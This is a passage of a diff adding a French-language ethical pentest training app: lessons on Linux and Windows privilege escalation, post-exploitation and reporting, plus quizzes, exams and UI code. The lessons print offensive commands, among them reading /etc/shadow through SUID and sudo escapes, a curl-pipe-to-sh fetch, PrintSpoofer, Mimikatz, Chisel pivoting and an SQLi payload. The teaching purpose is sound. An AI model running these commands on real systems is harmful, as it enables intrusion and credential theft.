+cours:"<h3>Techniques</h3><h4>1. SUID mal configuré</h4><pre>find / -perm -4000 -type f 2&gt;/dev/null</pre><h4>2. sudo mal configuré</h4><pre>sudo -l</pre><p>vim, less, find lancés en sudo = évasion.</p><h4>3. Cron</h4><p>Script root writable par user → on l écrase.</p><h4>4. Kernel exploit</h4><pre>uname -a</pre><p>Chercher CVE (Dirty Pipe).</p><h4>5. Capabilities</h4><pre>getcap -r / 2&gt;/dev/null</pre><h4>Outils</h4><ul><li>LinPEAS (auto)</li><li>pspy (surveille)</li></ul><div class=\"analogy\">Vous êtes dans l immeuble. Chaque porte mal fermée = opportunité : fenêtre ouverte, badge oublié, clé sous paillasson.</div><div class=\"bank\">www-data → root = faille critique en audit.</div><div class=\"df\">Toujours vérifier le périmètre dans le contrat.</div>",
+cas:"<h3>Cas 1 — SUID /bin/cp</h3><pre>/bin/cp /etc/shadow /tmp/shadow.txt</pre><p>Si SUID root, copie avec droits root.</p><h3>Cas 2 — sudo less</h3><pre>sudo less /etc/shadow\n!/bin/sh</pre><p>! exécute un shell — shell root.</p><h3>Cas 3 — LinPEAS</h3><pre>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</pre>",
+quiz:[
+{q:'SUID ?',o:['Droits propriétaire','Chiffrer','Router','Bloquer'],c:0,e:'Set User ID.'},
+{q:'LinPEAS ?',o:['Scanner réseau','Enum failles Linux','Chiffrer','DNS'],c:1,e:'Auto.'},
+{q:'sudo -l ?',o:['Lister commandes sudo','Cracker','Chiffrer','Router'],c:0,e:'Liste.'}
+]},
+
+{id:8, titre:"Privilege escalation Windows", intro:"Sur Windows, escalation via services, tokens, registre.",
+cours:"<h3>Techniques</h3><h4>1. Unquoted Service Path</h4><p>Chemin avec espaces sans guillemets. Windows cherche C:\\Program.exe, C:\\Program Files\\My.exe...</p><pre>wmic service get name,displayname,pathname,startmode | findstr /i \"auto\"</pre><h4>2. Permissions faibles</h4><pre>icacls \"C:\\Program Files\\MonApp\\service.exe\"</pre><h4>3. Tokens</h4><p>SeImpersonatePrivilege → JuicyPotato/PrintSpoofer → SYSTEM.</p><pre>whoami /priv</pre><h4>4. AlwaysInstallElevated</h4><pre>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated</pre><h4>Outils</h4><ul><li>WinPEAS</li><li>PowerUp</li><li>BeRoot</li></ul><div class=\"analogy\">Chaque service = un employé. Badge trop large, bureau mal fermé, clé oubliée = pouvoir en plus.</div><div class=\"bank\">LocalSystem + poste compromis = PC + souvent AD.</div><div class=\"df\">AlwaysInstallElevated = critique si activé.</div>",
+cas:"<h3>Cas 1 — Unquoted Path</h3><pre>wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"C:\\\\Windows\"</pre><p>Placer binaire à C:\\Program.exe.</p><h3>Cas 2 — SeImpersonate</h3><pre>whoami /priv\nPrintSpoofer.exe -i -c cmd</pre><h3>Cas 3 — AlwaysInstallElevated</h3><pre>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated</pre>",
+quiz:[
+{q:'Unquoted Path ?',o:['Service sans guillemets','Firewall','Antivirus','DNS'],c:0,e:'Windows cherche ailleurs.'},
+{q:'SeImpersonate ?',o:['Rien','Usurper SYSTEM','Chiffrer','Router'],c:1,e:'JuicyPotato.'},
+{q:'AlwaysInstallElevated=1 ?',o:['Critique','Sûr','Antivirus','Chiffrement'],c:0,e:'MSI en SYSTEM.'}
+]},
+
+{id:9, titre:"Post-exploitation et pivoting", intro:"Après compromission : persistance, credentials, pivoting vers d autres machines.",
+cours:"<h3>Ce qu on fait</h3><ul><li>Maintenir l accès (persistance)</li><li>Élever les privilèges</li><li>Récolter les credentials</li><li>Pivoter</li><li>Exfiltrer (simulation)</li></ul><h3>Persistance Linux</h3><ul><li>Clé SSH dans authorized_keys</li><li>Cron</li><li>.bashrc</li><li>Service systemd</li></ul><h3>Persistance Windows</h3><ul><li>Clé Run</li><li>Service</li><li>Tâche planifiée</li><li>Compte local caché</li></ul><h3>Credential dumping</h3><ul><li>Mimikatz (hashs + tickets)</li><li>hashdump (meterpreter)</li><li>/etc/shadow (Linux root)</li></ul><h3>Pivoting</h3><ul><li>SSH tunnel : <code>ssh -L 8080:interne:80 user@machine</code></li><li>Metasploit portfwd</li><li>Chisel (tunnel HTTP)</li><li>ProxyChains</li></ul><div class=\"analogy\">Vous êtes entré. Vous cherchez les clés des autres bureaux, vous installez un retour, vous passez par les bouches d aération.</div><div class=\"bank\">Poste compromis + réseau non segmenté = serveur central atteint. Segmentation = critique.</div><div class=\"df\">Persistance doit être RETIRÉE en fin de pentest.</div>",
+cas:"<h3>Cas 1 — Hashdump</h3><pre>hashdump</pre><p>Ou Mimikatz : sekurlsa::logonpasswords.</p><h3>Cas 2 — SSH pivot</h3><pre>ssh -L 8080:192.168.10.50:80 user@192.168.1.10</pre><p>Port 8080 local → serveur interne via 192.168.1.10.</p><h3>Cas 3 — Chisel</h3><pre>chisel server -p 8080 --reverse\nchisel client 192.168.1.5:8080 R:socks</pre><p>Proxy SOCKS via cible.</p>",
+quiz:[
+{q:'Mimikatz ?',o:['Fichiers','Hashs Kerberos de RAM','Emails','DNS'],c:1,e:'LSASS.'},
+{q:'Pivoting ?',o:['Chiffrer','Atteindre autres via compromise','Router','Bloquer'],c:1,e:'Rebond.'},
+{q:'Persistance doit être ?',o:['Gardée','Retirée','Publiée','Vendue'],c:1,e:'Fin de pentest.'}
+]},
+
+{id:10, titre:"Rapport de pentest et légal", intro:"Le rapport est le livrable le plus important. Clair, priorisé, reproductible.",
+cours:"<h3>Structure</h3><ol><li>Page de garde (client, dates, périmètre)</li><li>Résumé exécutif (1 page, non technique)</li><li>Méthodologie (OWASP, PTES)</li><li>Synthèse des vulnérabilités</li><li>Vulnérabilités détaillées</li><li>Recommandations priorisées</li><li>Annexes (preuves)</li></ol><h3>Fiche vulnérabilité</h3><ul><li>Titre</li><li>Sévérité (CVSS)</li><li>Description</li><li>Impact</li><li>PoC (preuve)</li><li>Recommandation</li><li>Références</li></ul><h3>CVSS</h3><table><tr><th>Score</th><th>Sévérité</th></tr><tr><td>9.0-10</td><td>Critique</td></tr><tr><td>7.0-8.9</td><td>Élevée</td></tr><tr><td>4.0-6.9</td><td>Moyenne</td></tr><tr><td>0.1-3.9</td><td>Faible</td></tr></table><h3>Cadre légal</h3><ul><li>Autorisation écrite AVANT</li><li>NDA</li><li>Périmètre précis</li><li>Durée</li><li>Signaler toute faille critique immédiatement</li></ul><div class=\"analogy\">Rapport = diagnostic médecin. Symptômes, examens, ordonnance avec priorités.</div><div class=\"bank\">Rapport exigé par BCEAO et PCI-DSS. Conservé plusieurs années.</div><div class=\"df\">Sans preuves = rapport inutile.</div>",
+cas:"<h3>Cas 1 — Fiche vuln SQLi</h3><ul><li>Sévérité : Critique (9.8)</li><li>URL : portail.banque.ci/product?id=1</li><li>Description : paramètre concaténé</li><li>Impact : extraction base complète</li><li>PoC : id=1' OR '1'='1</li><li>Recommandation : requêtes préparées</li></ul><h3>Cas 2 — Prioriser</h3><ol><li>Critique (24h) : SQLi, RCE</li><li>Élevée (7j) : XSS stocké, IDOR</li><li>Moyenne (30j) : headers</li><li>Faible (trimestre) : infos mineures</li></ol><h3>Cas 3 — Restitution</h3><p>15 min exécutif + 45 min technique + Q&amp;R.</p>",
+quiz:[
+{q:'CVSS 9.8 ?',o:['Faible','Moyenne','Élevée','Critique'],c:3,e:'9.0-10.'},
+{q:'Rapport doit contenir ?',o:['Texte seul','Preuves, impact, recos','Résumé seul','Rien'],c:1,e:'Preuves.'},
+{q:'Pentest doit être ?',o:['Sans prévenir','Autorisé et documenté','Destructeur','Anonyme'],c:1,e:'Autorisation écrite.'}
+]}
+];
+
+/* ============================================================
+   CERTIFICATIONS + JOBS + EXAMENS
+   ============================================================ */
+var CERTS = [
+{id:'tryhackme', nom:'Pre-Security Path', org:'TryHackMe', free:true, niv:'Débutant', req:0, lien:'https://tryhackme.com/path/outline/presecurity', desc:'Bases pentest.'},
+{id:'tryhackme-jr', nom:'Jr Penetration Tester', org:'TryHackMe', free:true, niv:'Intermédiaire', req:3, lien:'https://tryhackme.com/path/outline/jrpenetrationtester', desc:'Parcours pentest.'},
+{id:'htb', nom:'HTB Academy', org:'Hack The Box', free:true, niv:'Intermédiaire', req:5, lien:'https://academy.hackthebox.com/', desc:'Labs pentest.'},
+{id:'ejpt', nom:'eJPT', org:'INE Security', free:false, prix:'~200 USD', niv:'Intermédiaire', req:7, lien:'https://security.ine.com/certifications/ejpt-certification/', desc:'Junior pentester.'},
+{id:'comptia-pentest', nom:'CompTIA PenTest+', org:'CompTIA', free:false, prix:'~404 USD', niv:'Avancé', req:10, lien:'https://www.comptia.org/certifications/pentest', desc:'Pentest éthique.'},
+{id:'ceh', nom:'CEH', org:'EC-Council', free:false, prix:'~1199 USD', niv:'Intermédiaire+', req:10, lien:'https://www.eccouncil.org/programs/certified-ethical-hacker-ceh/', desc:'Hacking éthique.'},
+{id:'pnpt', nom:'PNPT', org:'TCM Security', free:false, prix:'~399 USD', niv:'Avancé', req:10, lien:'https://certifications.tcm-sec.com/pnpt/', desc:'Practical Network Penetration Tester.'},
+{id:'oscp', nom:'OSCP', org:'OffSec', free:false, prix:'~1599 USD', niv:'Avancé', req:10, lien:'https://www.offsec.com/courses/pen-200/', desc:'LA certif pentest.'},
+{id:'crtp', nom:'CRTP', org:'Altered Security', free:false, prix:'~399 USD', niv:'Avancé', req:10, lien:'https://www.alteredsecurity.com/adlab', desc:'Pentest AD.'},
+{id:'cissp', nom:'CISSP', org:'ISC2', free:false, prix:'~749 USD', niv:'Expert', req:10, lien:'https://www.isc2.org/certifications/cissp', desc:'RSSI.'}
+];
+
+var JOBS = [
+{t:'Pentester Junior', o:'Groupe COFINA', l:'Abidjan', d:'Tests intrusion web et réseau.', u:'https://www.groupecofina.com/carriere/'},
+{t:'Ingénieur Cybersécurité Senior', o:'BDU CI', l:'Abidjan', d:'SIEM, pentest.', u:'https://bduci.com/'},
+{t:'Chargé Sécurité SI', o:'DC/BR UMOA', l:'Abidjan', d:'Sécurité SI.', u:'https://www.dcbruemoa.org/'},
+{t:'Stagiaire Pentest', o:'AFG Holding', l:'Abidjan', d:'Pentest junior.', u:'https://afgholding-sa.com/'},
+{t:'Pentester / Red Team', o:'Djamo', l:'Abidjan', d:'Pentest fintech.', u:'https://djamo.com/'},
+{t:'Analyste SOC', o:'Eclozion', l:'Abidjan', d:'Surveillance.', u:'https://ci.eclozion-opportunities.com/'}
+];
+
+var EXAMENS = {
+partiel: {
+  titre:'Examen partiel — Défis 1-5',
+  desc:'Intro pentest, OSINT, Nmap, exploitation, Metasploit. Réussite : 60 %.',
+  req:[1,2,3,4,5],
+  qs:[
+    {q:'Pentest nécessite ?', o:['Rien','Autorisation écrite','VPN','Antivirus'], c:1, e:'Obligatoire.'},
+    {q:'OSINT ?', o:['Open Source Intelligence','Online System','Open System','Optical'], c:0, e:'Public.'},
+    {q:'-sV ?', o:['Versions','Chiffrer','Router','Ping'], c:0, e:'Version detection.'},
+    {q:'sqlmap ?', o:['Scanner','SQLi','Chiffrer','DNS'], c:1, e:'Exploit SQLi.'},
+    {q:'Meterpreter ?', o:['Antivirus','Payload','Scanner','Firewall'], c:1, e:'Post-exploit.'}
+  ]
+},
+final: {
+  titre:'Examen final — Défis 1-10',
+  desc:'Examen complet. Réussite : 80 %.',
+  req:[1,2,3,4,5,6,7,8,9,10],
+  qs:[
+    {q:'Hashcat ?', o:['Scanner','Cracker hashs','Chiffrer','Router'], c:1, e:'GPU.'},
+    {q:'Spraying ?', o:['Beaucoup par compte','1 essai par compte','Chiffrer','DNS'], c:1, e:'Anti-lockout.'},
+    {q:'SUID ?', o:['Droits propriétaire','Chiffrer','Router','Bloquer'], c:0, e:'Set User ID.'},
+    {q:'SeImpersonate ?', o:['Rien','Usurper SYSTEM','Chiffrer','DNS'], c:1, e:'JuicyPotato.'},
+    {q:'Mimikatz ?', o:['Fichiers','Hashs LSASS','Emails','DNS'], c:1, e:'RAM.'},
+    {q:'Pivoting ?', o:['Chiffrer','Atteindre via compromise','Router','Bloquer'], c:1, e:'Rebond.'},
+    {q:'CVSS 9.8 ?', o:['Faible','Moyenne','Élevée','Critique'], c:3, e:'Critique.'},
+    {q:'Rapport doit contenir ?', o:['Rien','Preuves, impact, recos','Résumé','Rien précis'], c:1, e:'Preuves.'},
+    {q:'Backdoor doit être ?', o:['Gardée','Retirée','Publiée','Vendue'], c:1, e:'Retirée.'},
+    {q:'Sans autorisation ?', o:['Légal','Illégal','Gris','Autorisé'], c:1, e:'Délit.'}
+  ]
+}
+};
+
+/* ============================================================
+   RENDER (identique Niveau 5)
+   ============================================================ */
+function updateHeader() {
+  var el = document.getElementById('hs'); if (!el) return;
+  var u = user();
+  if (u) {
+    el.innerHTML = '<span class="pill">👤 ' + u.name + '</span>' +
+      '<span class="pill">N1 <b>' + countDone(1) + '</b></span>' +
+      '<span class="pill">N2 <b>' + countDone(2) + '</b></span>' +
+      '<span class="pill">N3 <b>' + countDone(3) + '</b></span>' +
+      '<span class="pill">N4 <b>' + countDone(4) + '</b></span>' +
+      '<span class="pill">N5 <b>' + countDone(5) + '</b></span>' +
+      '<span class="pill">N6 <b>' + countDone(6) + '</b></span>' +
+      '<a class="logout" onclick="logout()">Déconnexion</a>';
+  } else { el.innerHTML = '<span class="pill">Non connecté</span>'; }
+}
+
+function renderLogin() {
+  document.getElementById('app').innerHTML = '<div class="login-box"><div style="text-align:center;margin-bottom:18px"><div style="display:inline-block;width:56px;height:56px;border-radius:14px;background:linear-gradient(135deg,#ef4444,#b91c1c);display:flex;align-items:center;justify-content:center;font-size:1.7rem">🔴</div></div><h2>Niveau 6</h2><p style="text-align:center;color:#94a3b8;font-size:.85rem;margin-bottom:22px">Connecte-toi pour accéder au niveau Pentest éthique.</p><input id="loginName" placeholder="Ton prénom" autocomplete="off" style="width:100%;padding:12px;margin:8px 0;background:#0a1220;border:1.5px solid #1e2a44;border-radius:9px;color:#e8eef7;font-size:.95rem"><button onclick="login()" style="width:100%;margin-top:12px;padding:13px">Se connecter</button></div>';
+  setTimeout(function(){ var e = document.getElementById('loginName'); if (e) e.focus(); }, 100);
+}
+
+function renderLocked() {
+  var d5 = countDone(5);
+  var html = '<div class="card"><div class="cert-locked"><div class="icon">🔒</div><h3>Niveau 6 verrouillé</h3><p>Termine les 10 défis du Niveau 5 pour accéder au Niveau 6 (Pentest éthique).</p><div class="progress-small"><div style="width:' + (d5*10) + '%"></div></div><p style="color:#fbbf24;font-weight:700;font-size:1.1rem">' + d5 + ' / 10 défis Niveau 5</p><div class="nav" style="justify-content:center;flex-wrap:wrap"><button onclick="simulate()">🔓 Simuler N1 à N5</button><button class="sec" onclick="go(\'sync\')">🌐 Synchroniser</button></div></div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderHome() {
+  var u = user(); if (!u) return renderLogin();
+  var d = countDone(6);
+  var pct = Math.round(d / 10 * 100);
+  var html = '<div class="card"><h2>Bienvenue, ' + u.name + ' 🔴</h2><p>Niveau 6 : <strong>Pentest éthique</strong>. OSINT, Nmap, Metasploit, privilege escalation, rapport.</p>';
+  html += '<div class="stats-grid"><div class="stat"><span class="big">' + d + '/10</span><span class="lbl">Défis N6</span></div><div class="stat"><span class="big">' + u.certs.length + '</span><span class="lbl">Certifs</span></div><div class="stat"><span class="big">' + pct + '%</span><span class="lbl">Progression</span></div><div class="stat"><span class="big">' + (u.examens['6_partiel'] ? '✅' : '—') + '</span><span class="lbl">Partiel N6</span></div></div>';
+  html += '<div class="progress-bar"><div style="width:' + pct + '%"></div></div></div>';
+  html += '<div class="card"><h2>🚀 Accès rapide</h2><div class="nav">';
+  html += '<button onclick="go(\'\')">📚 Défis N6</button>';
+  html += '<button class="sec" onclick="go(\'stats\')">📊 Stats</button>';
+  html += '<button class="gold" onclick="go(\'certif\')">🎓 Certificat</button>';
+  html += '<button class="sec" onclick="go(\'cv\')">📄 CV pro</button>';
+  html += '<button class="sec" onclick="go(\'jobs\')">💼 Emploi</button>';
+  html += '<button class="sec" onclick="go(\'examens\')">📝 Examens</button>';
+  html += '<button class="sec" onclick="go(\'certs\')">🎓 Certifications</button>';
+  html += '<button class="sec" onclick="go(\'sync\')">🌐 Sync</button>';
+  html += '</div></div>';
+  html += '<div class="card"><h2>🎯 Les 10 défis du Niveau 6</h2><div class="grid">';
+  for (var i = 0; i < DEFIS.length; i++) {
+    var df = DEFIS[i];
+    var done = u.done['6_' + df.id];
+    html += '<div class="btn ' + (done ? 'done' : '') + '" onclick="go(\'defi/' + df.id + '\')"><span class="n">Défi ' + df.id + (done ? ' ✓' : '') + '</span><span class="ti">' + df.titre + '</span></div>';
+  }
+  html += '</div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderDefi(id) {
+  var d = null;
+  for (var i = 0; i < DEFIS.length; i++) { if (DEFIS[i].id === id) { d = DEFIS[i]; break; } }
+  if (!d) { alert('Défi introuvable'); go('home'); return; }
+  var u = user();
+  var done = u.done['6_' + id];
+  var html = '<div class="crumb"><a onclick="go(\'home\')">Accueil N6</a> / Défi ' + id + '</div>';
+  html += '<div class="card"><h2>' + d.titre + '</h2><div class="intro">' + d.intro + '</div></div>';
+  html += '<div class="card"><h2>📖 Cours</h2>' + d.cours + '</div>';
+  html += '<div class="card"><h2>🔧 Cas pratiques</h2>' + d.cas + '</div>';
+  html += '<div class="card"><h2>📝 Quiz</h2><div class="quiz">';
+  for (var qi = 0; qi < d.quiz.length; qi++) {
+    var q = d.quiz[qi];
+    html += '<div class="q" data-i="' + qi + '"><p>Q' + (qi + 1) + '. ' + q.q + '</p>';
+    for (var oi = 0; oi < q.o.length; oi++) {
+      html += '<label><input type="radio" name="q' + qi + '" value="' + oi + '"> ' + q.o[oi] + '</label>';
+    }
+    html += '<div class="exp" id="exp' + qi + '">' + q.e + '</div></div>';
+  }
+  html += '<button onclick="validerQuiz(' + id + ')">Vérifier</button><div id="qr"></div></div></div>';
+  html += '<div class="nav">';
+  if (id > 1) html += '<button class="sec" onclick="go(\'defi/' + (id - 1) + '\')">← Précédent</button>';
+  if (id < 10) html += '<button class="sec" onclick="go(\'defi/' + (id + 1) + '\')">Suivant →</button>';
+  html += '<button onclick="go(\'home\')">🏠 Accueil</button>';
+  if (done) html += '<button class="green">✓ Validé</button>';
+  html += '</div>';
+  document.getElementById('app').innerHTML = html;
+  window.scrollTo(0, 0);
+}
+
+function validerQuiz(id) {
+  var d = null;
+  for (var i = 0; i < DEFIS.length; i++) { if (DEFIS[i].id === id) { d = DEFIS[i]; break; } }
+  if (!d) return;
+  var correct = 0;
+  for (var qi = 0; qi < d.quiz.length; qi++) {
+    var q = d.quiz[qi];
+    var sel = document.querySelector('input[name="q' + qi + '"]:checked');
+    var labels = document.querySelectorAll('.q[data-i="' + qi + '"] label');
+    for (var li = 0; li < labels.length; li++) { labels[li].classList.remove('ok','ko'); }
+    var e = document.getElementById('exp' + qi); if (e) e.style.display = 'block';
+    if (sel && parseInt(sel.value) === q.c) { correct++; labels[q.c].classList.add('ok'); }
+    else { labels[q.c].classList.add('ok'); if (sel) labels[parseInt(sel.value)].classList.add('ko'); }
+  }
+  var u = user();
+  if (correct === d.quiz.length) {
+    var k = '6_' + id;
+    if (!u.done[k]) {
+      u.done[k] = true;
+      var t = today();
+      if (!u.jours[t]) u.jours[t] = [];
+      if (u.jours[t].indexOf(k) === -1) u.jours[t].push(k);
+    }
+  }
+  save();
+  var r = document.getElementById('qr');
+  var pass = correct === d.quiz.length;
+  r.className = 'res ' + (pass ? 'g' : 'r');
+  r.textContent = pass ? '🎉 ' + correct + '/' + d.quiz.length + ' — Défi validé !' : correct + '/' + d.quiz.length + ' — Réessaie';
+  if (pass && id === 10 && isComplete(6)) {
+    setTimeout(function(){ alert('🏆 FÉLICITATIONS !\nTu as terminé le Niveau 6 !'); }, 400);
+  }
+}
+
+function renderCertif() {
+  var u = user(); if (!u) return;
+  var d = countDone(6);
+  var unlocked = d >= 10;
+  var certId = 'MDPC-N6-' + u.name.slice(0,3).toUpperCase() + '-' + d;
+  var html = '<div class="card">';
+  if (!unlocked) {
+    html += '<div class="cert-locked"><div class="icon">🔒</div><h3>Certificat N6 verrouillé</h3><p>Valide les 10 défis pour débloquer.</p><div class="progress-small"><div style="width:' + (d*10) + '%"></div></div><p style="color:#fbbf24;font-weight:700;margin-top:10px">' + d + ' / 10</p><div class="nav" style="justify-content:center;margin-top:14px"><button onclick="go(\'\')">📚 Continuer</button></div></div>';
+  } else {
+    html += '<div class="certificate"><div class="seal">🏆</div><div class="subtitle">Certificat officiel</div><div class="title">Niveau 6 — Pentest éthique</div><div class="certifies">décerné à</div><div class="name">' + u.name + '</div><p style="color:#94a3b8;max-width:500px;margin:12px auto;font-size:.88rem">Pour avoir validé les 10 défis du Niveau 6 : OSINT, Nmap, Metasploit, exploitation, privilege escalation, post-exploitation, rapport.</p><div class="details"><div>Défis<strong>10/10</strong></div><div>Partiel<strong>' + (u.examens['6_partiel'] ? '✅' : '—') + '</strong></div><div>Final<strong>' + (u.examens['6_final'] ? '✅' : '—') + '</strong></div><div>Date<strong>' + new Date().toLocaleDateString('fr-FR') + '</strong></div></div><div class="cert-id">ID : ' + certId + '</div><div class="signature"><div class="signature-block"><div class="sig-name">H. N\'GUESSAN</div><div class="sig-line">Fondateur</div></div><div class="signature-block"><div class="sig-name" style="font-family:Georgia,serif">' + new Date().toLocaleDateString('fr-FR') + '</div><div class="sig-line">Date</div></div></div></div>';
+    html += '<div class="nav" style="justify-content:center;margin-top:14px"><button onclick="window.print()">🖨️ PDF</button><button class="gold" onclick="go(\'cv\')">📄 CV</button></div>';
+  }
+  html += '</div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderCV() {
+  var u = user(); if (!u) return;
+  var d1 = countDone(1), d2 = countDone(2), d3 = countDone(3), d4 = countDone(4), d5 = countDone(5), d6 = countDone(6);
+  var badges = '';
+  for (var i = 0; i < u.certs.length; i++) {
+    for (var j = 0; j < CERTS.length; j++) {
+      if (CERTS[j].id === u.certs[i]) { badges += '<span class="cv-badge">' + CERTS[j].nom + '</span>'; break; }
+    }
+  }
+  if (!badges) badges = '<span style="color:#94a3b8;font-size:.85rem;font-style:italic">Aucune certification.</span>';
+  var defis = '';
+  for (var i = 0; i < DEFIS.length; i++) {
+    defis += '<li>' + (u.done['6_' + DEFIS[i].id] ? '✓' : '○') + ' ' + DEFIS[i].titre + '</li>';
+  }
+  var html = '<div class="card" style="background:none;border:none;padding:0">';
+  html += '<div class="nav" style="margin-bottom:14px"><button onclick="window.print()">🖨️ PDF</button><button class="sec" onclick="copyCV()">📋 Copier</button></div>';
+  html += '<div class="cv-container"><div class="cv-page">';
+  html += '<div class="cv-header"><div><h1>' + u.name.toUpperCase() + '</h1><div class="role">Étudiant L2 UVCI · Aspirant Pentester</div><div class="objective">Passionné par le pentest et la sécurité offensive, je cherche à appliquer mes compétences dans le secteur bancaire ivoirien.</div></div><div class="right">📍 Abidjan<br>🎓 L2 UVCI<br>📅 ' + new Date().toLocaleDateString('fr-FR') + '</div></div>';
+  html += '<div class="cv-section"><h2>Formation</h2>';
+  html += '<div class="cv-item"><div class="line1"><span class="title">Licence 2 — UVCI</span><span class="date">En cours</span></div><div class="org">Sciences informatiques</div><div class="desc">Formation universitaire, focus sécurité offensive.</div></div>';
+  html += '<div class="cv-item"><div class="line1"><span class="title">Mon Drôle Parcours Cyber N1 → N6</span><span class="date">N6 : ' + d6 + '/10</span></div><div class="org">Parcours complet cybersécurité</div><div class="desc">Fondamentaux, Réseaux, Linux/Windows, Crypto, Sécurité Web, Pentest.</div></div>';
+  html += '</div>';
+  html += '<div class="cv-section"><h2>Compétences</h2><div class="skills-grid">';
+  html += '<div class="skill"><div class="name"><span>N1</span><span>' + Math.round(d1*10) + '%</span></div><div class="bar"><div style="width:' + Math.round(d1*10) + '%"></div></div></div>';
+  html += '<div class="skill"><div class="name"><span>N2</span><span>' + Math.round(d2*10) + '%</span></div><div class="bar"><div style="width:' + Math.round(d2*10) + '%"></div></div></div>';
+  html += '<div class="skill"><div class="name"><span>N3</span><span>' + Math.round(d3*10) + '%</span></div><div class="bar"><div style="width:' + Math.round(d3*10) + '%"></div></div></div>';
+  html += '<div class="skill"><div class="name"><span>N4</span><span>' + Math.round(d4*10) + '%</span></div><div class="bar"><div style="width:' + Math.round(d4*10) + '%"></div></div></div>';
+  html += '<div class="skill"><div class="name"><span>N5</span><span>' + Math.round(d5*10) + '%</span></div><div class="bar"><div style="width:' + Math.round(d5*10) + '%"></div></div></div>';
+  html += '<div class="skill"><div class="name"><span>N6 Pentest</span><span>' + Math.round(d6*10) + '%</span></div><div class="bar"><div style="width:' + Math.round(d6*10) + '%"></div></div></div>';
+  html += '</div></div>';
+  html += '<div class="cv-section"><h2>Défis N6 validés</h2><ul style="font-size:.85rem;color:#334155">' + defis + '</ul></div>';
+  html += '<div class="cv-section"><h2>Certifications</h2>' + badges + '</div>';
+  html += '<div class="cv-footer">Généré le ' + new Date().toLocaleDateString('fr-FR') + ' · H. N\'GUESSAN ®</div>';
+  html += '</div></div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function copyCV() {
+  var u = user(); if (!u) return;
+  var d6 = countDone(6);
+  var t = u.name.toUpperCase() + '\nÉtudiant L2 UVCI — Aspirant Pentester\n\nParcours Cyber N1 à N6 (N6 : ' + d6 + '/10)\n\nCompétences : OSINT, Nmap, Metasploit, privilege escalation, post-exploitation, rapport\n\nGénéré le ' + new Date().toLocaleDateString('fr-FR');
+  if (navigator.clipboard) { navigator.clipboard.writeText(t).then(function(){ alert('CV copié !'); }, function(){ fbCopy(t); }); } else fbCopy(t);
+}
+function fbCopy(t) { var ta = document.createElement('textarea'); ta.value = t; document.body.appendChild(ta); ta.select(); try { document.execCommand('copy'); alert('CV copié !'); } catch (e) { alert('Copie manuelle'); } document.body.removeChild(ta); }
+
+function renderStats() {
+  var u = user(); if (!u) return;
+  var t = today();
+  var tt = u.jours[t] || [];
+  var html = '<div class="card"><h2>📊 Statistiques</h2><div class="stats-grid">';
+  html += '<div class="stat"><span class="big">' + countDone(1) + '</span><span class="lbl">N1</span></div>';
+  html += '<div class="stat"><span class="big">' + countDone(2) + '</span><span class="lbl">N2</span></div>';
+  html += '<div class="stat"><span class="big">' + countDone(3) + '</span><span class="lbl">N3</span></div>';
+  html += '<div class="stat"><span class="big">' + countDone(4) + '</span><span class="lbl">N4</span></div>';
+  html += '<div class="stat"><span class="big">' + countDone(5) + '</span><span class="lbl">N5</span></div>';
+  html += '<div class="stat"><span class="big">' + countDone(6) + '</span><span class="lbl">N6</span></div>';
+  html += '</div></div>';
+  html += '<div class="card"><h3>🔥 Aujourd hui</h3>';
+  if (tt.length === 0) html += '<p style="color:#94a3b8">Aucun défi.</p>';
+  else { html += '<ul class="today-list">'; for (var i = 0; i < tt.length; i++) { html += '<li>✅ ' + tt[i] + '</li>'; } html += '</ul>'; }
+  html += '</div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderJobs() {
+  var html = '<div class="card"><h2>💼 Offres CI</h2><div class="jobs-grid">';
+  for (var i = 0; i < JOBS.length; i++) {
+    var j = JOBS[i];
+    html += '<div class="job-item"><h4>' + j.t + '</h4><div class="job-org">' + j.o + ' · ' + j.l + '</div><div class="job-desc">' + j.d + '</div><a class="job-link" href="' + j.u + '" target="_blank">Voir ↗</a></div>';
+  }
+  html += '</div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+
+function renderCerts() {
+  var u = user();
+  var d = countDone(6);
+  var html = '<div class="card"><h2>🎓 Certifications</h2><div class="tabs">';
+  html += '<div class="tab active" onclick="filterCerts(this,\'all\')">Toutes</div>';
+  html += '<div class="tab" onclick="filterCerts(this,\'free\')">Gratuites</div>';
+  html += '<div class="tab" onclick="filterCerts(this,\'paid\')">Payantes</div>';
+  html += '<div class="tab" onclick="filterCerts(this,\'done\')">Obtenues</div>';
+  html += '</div><div class="certs-grid">';
+  for (var i = 0; i < CERTS.length; i++) {
+    var c = CERTS[i];
+    var isD = u.certs.indexOf(c.id) !== -1;
+    html += '<div class="cert-item ' + (c.free ? 'free' : 'paid') + ' ' + (isD ? 'done' : '') + '" data-t="' + (c.free ? 'free' : 'paid') + '" data-d="' + (isD ? '1' : '0') + '">';
+    html += '<h4>' + c.nom + '</h4><div class="org">' + c.org + '</div>';
+    html += '<div><span class="tag ' + (c.free ? 'free' : 'paid') + '">' + (c.free ? 'GRATUIT' : c.prix) + '</span><span class="tag lvl">' + c.niv + '</span></div>';
+    html += '<p>' + c.desc + '</p><div class="actions"><a href="' + c.lien + '" target="_blank">Voir ↗</a><button onclick="toggleCert(\'' + c.id + '\')">' + (isD ? '✓ Obtenue' : 'Marquer') + '</button></div></div>';
+  }
+  html += '</div></div>';
+  document.getElementById('app').innerHTML = html;
+}
+function filterCerts(el, type) {
+  var tabs = document.querySelectorAll('.tab');
+  for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('active');
+  el.classList.add('active');
+  var items = document.querySelectorAll('.cert-item');
+  for (var i = 0; i < items.length; i++) {
+    var m = false;
+    if (type === 'all') m = true;
+    else if (type === 'done') m = items[i].dataset.d === '1';
+    else m = items[i].dataset.t === type;
+    items[i].style.display = m ? 'block' : 'none';
+  }
+}
+function toggleCert(id) {
+  var u = user(); if (!u) return;
+  var i = u.certs.indexOf(id);
+  if (i === -1) u.certs.push(id); else u.certs.splice(i, 1);
+  save(); renderCerts();
+}
+
+function renderExamens() {
